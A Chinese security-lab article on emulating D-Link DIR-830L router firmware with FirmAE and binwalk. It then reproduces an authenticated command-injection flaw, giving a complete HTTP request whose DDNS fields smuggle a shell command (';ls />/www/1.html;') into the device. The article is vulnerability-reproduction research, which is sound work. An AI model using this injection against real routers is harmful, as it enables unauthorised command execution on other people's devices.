> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/9mmccpJVYOvib_af6DAOow)

  

  

  

**环境搭建**

**1.FirmAE 工具安装**

首先拉取 FirmAE 工具仓库

```
git clone --recursive https://github.com/pr0v3rbs/FirmAE

```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/gauNkjeXJb7YDf4icKyicb8JFYxKib26fhB4XPmNgB50Ksnn4icjZSwSzfSXv1AGKFqFVcndw0qn1XGB2qCTNjogUQ/640?wx_fmt=png)

运行下载脚本

```
cd FirmAE/
./download.sh

```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/gauNkjeXJb7YDf4icKyicb8JFYxKib26fhBrMEfAsDDY4uD7eSYSlbZNTr7BZicECZPkab8cLAoqnJAIk2ZtI0a9tw/640?wx_fmt=png)

运行./install.sh 进行安装

![](https://mmbiz.qpic.cn/sz_mmbiz_png/gauNkjeXJb7YDf4icKyicb8JFYxKib26fhBh9ibTwYQEy7HjIMMegSss0OHicuJTvW2ZlCTu5fwPME1x4diaSXe4MWkw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/gauNkjeXJb7YDf4icKyicb8JFYxKib26fhBQNo3cXzePu1bBsl2j89jktiaNBiauZeMOy33uMRN2YwEKzCok81AsDPg/640?wx_fmt=png)

**2. 下载固件**

本文模拟的是设备型号为 D-Link DIR-830L

下载地址:

```
https://legacy.us.dlink.com/pages/product.aspx?id=f5e0c0a1975a46bab0b5f38b22c5087b

```

下载后得到 DIR830LA1_FW100B07.bin 固件文件

![](https://mmbiz.qpic.cn/sz_mmbiz_png/gauNkjeXJb7YDf4icKyicb8JFYxKib26fhBpmveKkHtZ0HyrAiahJ8pAw7j2XGnSJxeXibjrhN6L4fEVLe7ia2xO5reg/640?wx_fmt=png)

**3.FirmAE 工具初始化**

在 FirmAE 工具目录下执行./init.sh 进行初始化

![](https://mmbiz.qpic.cn/sz_mmbiz_png/gauNkjeXJb7YDf4icKyicb8JFYxKib26fhBOfGGWC1tJTYx1pLkibdVsQvSLaYCj1n8cDH8zics3qtxdTrMYn9mtjicQ/640?wx_fmt=png)

**4. 安装 binwalk**

这里使用 FirmAE 工具目录下的 binwalk 安装程序进行安装

```
cd binwalk-2.3.3/
python3 setup.py install

```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/gauNkjeXJb7YDf4icKyicb8JFYxKib26fhBa9F45aD8CRgY9rtWS2Ie5nT24qrg2PQjXDibNe0EnX0klFSywbD6YKw/640?wx_fmt=png)

**5. 模拟运行固件**  
执行如下命令对固件进行解压

```
binwalk -Me /root/DIR830LA1_FW100B07.bin --run-as=root

```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/gauNkjeXJb7YDf4icKyicb8JFYxKib26fhBRJf45iajBTPUicINCyicibGyO5gWoDUXW1HAJcpkANwtm7miaf60U5aGRHA/640?wx_fmt=png)

执行如下命令来模拟运行固件

```
sudo ./run.sh -r DIR-830 /root/DIR830LA1_FW100B07.bin

```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/gauNkjeXJb7YDf4icKyicb8JFYxKib26fhBVEfdicc5r1E7iaskicBX3w9vWq4KZJ5ibXIic453jicldhSTbZEmDma0PK9Q/640?wx_fmt=png)

使用浏览器访问 http://192.168.0.1

![](https://mmbiz.qpic.cn/sz_mmbiz_png/gauNkjeXJb7YDf4icKyicb8JFYxKib26fhBw1TemdaFXQ14iaCaX5ibIun4pN1PhJNvgdMZ3icDZtmSZ3EplaFPUuqgg/640?wx_fmt=png)

  

  

  

**漏洞复现**

Exp 如下：

```
POST /ddns_check.ccp HTTP/1.1
Host: 192.168.0.1
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:95.0) Gecko/20100101 Firefox/95.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
X-Requested-With: XMLHttpRequest
Content-Length: 102
Origin: http://192.168.0.1
Connection: close
Cookie: uid=YnnCDFxmJY # 认证信息，此漏洞需要认证
ccp_act=doCheck&ddnsHostName=;ls />/www/1.html;&ddnsUsername=;ls />/www/1.html;&ddnsPassword=123123123

```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/gauNkjeXJb7YDf4icKyicb8JFYxKib26fhBWCJkdKNWDKQLojUbTvC9tjQEVG98giaw082YJKsQreImXQkff0deRxQ/640?wx_fmt=png)

这里我们已经成功看到执行系统命令，并将 ls / 命令的结果写入 1.html 中，直接访问即可查看命令执行的效果。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/gauNkjeXJb7YDf4icKyicb8JFYxKib26fhBqt0lHTIoXlvjYvVKUS87Wiap6pia8PiacF4jtCQjhfB7KPdRpibHpDr9xg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_gif/C6nwdaicQKwWT4HLCv7hz9cCjEYLXqWZJayhCdh0Ix1GdDpSicv8wAlW178gA8TSndNp9mZcsYGr6ubhibS8Odomg/640?wx_fmt=gif)

美创科技旗下第 59 号实验室，专注于数据安全技术领域研究，聚焦于安全防御理念、攻防技术、威胁情报等专业研究，进行知识产权转化并赋能于产品。累计向 CNVD、CNNVD 等平台提报数百个高质量原创漏洞，发明专利数十篇，团队著有《数据安全实践指南》